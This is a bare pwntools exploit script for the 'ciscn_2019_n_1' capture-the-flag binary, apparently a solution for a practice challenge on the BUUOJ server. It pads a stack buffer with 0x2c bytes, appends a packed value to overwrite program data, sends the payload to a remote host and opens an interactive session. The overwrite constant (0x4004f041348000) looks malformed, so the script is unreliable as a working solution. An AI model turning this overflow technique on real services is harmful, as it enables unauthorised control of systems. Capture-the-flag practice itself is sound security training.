#coding:utf-8
from pwn import *
# sh = process("./ciscn_2019_n_1")
sh = remote("node3.buuoj.cn",27708)
elf = ELF("./ciscn_2019_n_1")
payload = 'a'*0x2c
payload+=p64(0x4004f041348000)
sh.sendline(payload)
sh.interactive()
